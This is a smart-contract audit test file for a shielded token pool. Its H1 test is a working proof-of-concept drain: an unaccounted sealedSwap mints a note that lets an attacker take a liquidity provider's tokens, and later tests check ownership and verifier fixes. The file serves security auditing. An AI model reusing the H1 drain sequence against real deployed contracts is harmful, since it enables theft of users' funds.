// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {stdJson} from "forge-std/StdJson.sol";
import {ShieldPoolPoseidon} from "../src/ShieldPoolPoseidon.sol";
import {ShieldPoolCore} from "../src/ShieldPoolCore.sol";
import {IVerifier} from "../src/interfaces/IVerifier.sol";
import {IPoseidon2} from "../src/lib/IPoseidon.sol";
import {MockERC20} from "./MockERC20.sol";

/**
 * Kensho CONTRACT-side findings (accounting + state machine).
 *
 * MockVerifier == "attacker holds a valid Groth16 proof for these public inputs".
 * Faithful for contract-side accounting review: the pool's own solvency logic must
 * hold even when every proof it is handed is genuinely valid.
 */
contract MockVerifier is IVerifier {
    bool public ok = true;
    function setOk(bool v) external { ok = v; }
    function verify(bytes calldata, uint256[] calldata) external view returns (bool) {
        return ok;
    }
}

contract KenshoContractFindingsTest is Test {
    using stdJson for string;

    ShieldPoolPoseidon pool;
    MockVerifier unshieldV;
    MockVerifier sealedV;
    address poseidon2;

    address lp = address(0x11c7);      // honest assetOut liquidity provider
    address attacker = address(0xA11CE);

    MockERC20 tokenIn;   // assetIn
    MockERC20 tokenOut;  // assetOut

    function setUp() public {
        poseidon2 = _deployPoseidon();
        unshieldV = new MockVerifier();
        sealedV = new MockVerifier();
        pool = new ShieldPoolPoseidon(poseidon2, address(unshieldV));
        pool.setSealedSwapVerifier(address(sealedV));

        tokenIn = new MockERC20();
        tokenOut = new MockERC20();
    }

    // ───────────────────────────────────────────────────────────────────────────
    // H1 — sealedSwap mints an assetOut note WITHOUT crediting deposited[assetOut]
    //      (and without debiting deposited[assetIn]). The per-asset solvency
    //      invariant `deposited[asset] == sum(live note value in asset)` breaks:
    //      total assetOut claims exceed assetOut inventory, so an honest assetOut
    //      note holder can be permanently DoS'd / robbed, and the swapped-in
    //      assetIn is stranded (claimable by nobody except the owner).
    // ───────────────────────────────────────────────────────────────────────────
    function test_H1_sealedSwap_breaks_deposited_accounting() public {
        // Honest LP shields 100 tokenOut → deposited[tokenOut] = 100, pool holds 100.
        tokenOut.mint(lp, 100);
        vm.startPrank(lp);
        tokenOut.approve(address(pool), 100);
        pool.shield(address(tokenOut), 100, bytes32(uint256(0x1907E)));
        vm.stopPrank();
        assertEq(pool.deposited(address(tokenOut)), 100);

        // Owner pins a fair 1:1 rate for tokenIn → tokenOut.
        pool.setSwapRate(address(tokenIn), address(tokenOut), 1, 1, true);

        // Attacker shields 100 tokenIn → deposited[tokenIn] = 100, pool holds 100 tokenIn.
        tokenIn.mint(attacker, 100);
        vm.startPrank(attacker);
        tokenIn.approve(address(pool), 100);
        pool.shield(address(tokenIn), 100, bytes32(uint256(0xA7C1)));

        // Attacker swaps the whole 100 tokenIn note → a 100 tokenOut note (+ dust change).
        // Amounts are PRIVATE in the circuit; the contract cannot and does not touch
        // deposited[] for either asset here.
        bytes32 root = pool.currentRoot();
        pool.sealedSwap(
            hex"00",
            root,
            bytes32(uint256(0xE0001)),           // spent nullifier
            bytes32(uint256(0x00701E)),         // new tokenOut note (~100)
            bytes32(uint256(0xC0A9E)),          // new tokenIn change note (~0)
            address(tokenIn),
            address(tokenOut),
            1,                                   // amountOutMin
            1, 1                                 // rateIn, rateOut (owner-approved)
        );
        vm.stopPrank();

        // BUG: deposited did not move. There are now TWO tokenOut notes outstanding
        // (LP's 100 + attacker's ~100 = ~200 of claims) but deposited[tokenOut] is
        // still 100, and the pool physically holds only 100 tokenOut.
        assertEq(pool.deposited(address(tokenOut)), 100, "deposited[out] not credited");
        assertEq(pool.deposited(address(tokenIn)), 100, "deposited[in] not debited");
        assertEq(tokenOut.balanceOf(address(pool)), 100);

        // Attacker unshields their swap-minted tokenOut note for the full 100.
        vm.prank(attacker);
        pool.unshield(hex"00", root, bytes32(uint256(0xE0002)), address(tokenOut), attacker, 100);
        assertEq(tokenOut.balanceOf(attacker), 100, "attacker drained the LP's tokenOut");
        assertEq(pool.deposited(address(tokenOut)), 0);

        // The honest LP can no longer redeem their own 100 tokenOut note: insolvent.
        vm.prank(lp);
        vm.expectRevert(ShieldPoolCore.InsufficientPoolBalance.selector);
        pool.unshield(hex"00", root, bytes32(uint256(0xE0003)), address(tokenOut), lp, 100);

        // And the 100 tokenIn the attacker swapped in is stranded: deposited[tokenIn]
        // is still 100 but no live tokenIn note represents it (emergencyWithdraw is gone,
        // so nobody can move it). Net: LP lost 100 tokenOut with no recourse.
        assertEq(tokenIn.balanceOf(address(pool)), 100);
    }

    // ───────────────────────────────────────────────────────────────────────────
    // C1-regression — the shield-verifier "fix" is reversible by the owner: setting
    // it back to address(0) re-opens the unbound trust-the-client deposit path.
    // Documents a centralization/rug surface, not an external-attacker bug.
    // ───────────────────────────────────────────────────────────────────────────
    // M-4 FIX: the shield verifier is now one-way. Once bound-shield enforcement
    // is on, the owner can neither clear it (reset to 0) nor repoint it, so the
    // unbound C1 path can never be reopened. The prior PoC no longer holds.
    function test_shield_verifier_is_one_way_cannot_reopen_C1() public {
        MockVerifier shieldV = new MockVerifier();
        pool.setShieldVerifier(address(shieldV));

        // plain shield now blocked
        vm.deal(attacker, 10 ether);
        vm.prank(attacker);
        vm.expectRevert(ShieldPoolCore.ShieldProofRequired.selector);
        pool.shield{value: 1}(address(0), 1, bytes32(uint256(0x1)));

        // owner CANNOT unset it (one-way)
        vm.expectRevert(ShieldPoolCore.ShieldVerifierAlreadySet.selector);
        pool.setShieldVerifier(address(0));

        // owner CANNOT repoint it to an always-true verifier either
        MockVerifier other = new MockVerifier();
        vm.expectRevert(ShieldPoolCore.ShieldVerifierAlreadySet.selector);
        pool.setShieldVerifier(address(other));

        // unbound path stays closed
        vm.prank(attacker);
        vm.expectRevert(ShieldPoolCore.ShieldProofRequired.selector);
        pool.shield{value: 1}(address(0), 1, bytes32(uint256(0x1)));
    }

    // M-4 FIX: ownership handoff is two-step (transferOwnership names a pending
    // owner; only they can acceptOwnership), so it cannot be sent to a wrong or
    // dead address in one irreversible move.
    function test_two_step_ownership() public {
        address newOwner = address(0xBEEF);

        pool.transferOwnership(newOwner);
        // not transferred until accepted
        assertEq(pool.owner(), address(this));
        assertEq(pool.pendingOwner(), newOwner);

        // a stranger cannot accept
        vm.prank(attacker);
        vm.expectRevert(ShieldPoolCore.NotPendingOwner.selector);
        pool.acceptOwnership();

        // the pending owner accepts
        vm.prank(newOwner);
        pool.acceptOwnership();
        assertEq(pool.owner(), newOwner);
        assertEq(pool.pendingOwner(), address(0));

        // old owner has lost control
        vm.expectRevert(ShieldPoolCore.NotOwner.selector);
        pool.transferOwnership(address(this));
    }

    function _deployPoseidon() internal returns (address addr) {
        string memory json = vm.readFile("test/fixtures/Poseidon2.json");
        bytes memory bytecode = json.readBytes(".bytecode");
        assembly {
            addr := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        require(addr != address(0), "poseidon deploy failed");
    }
}
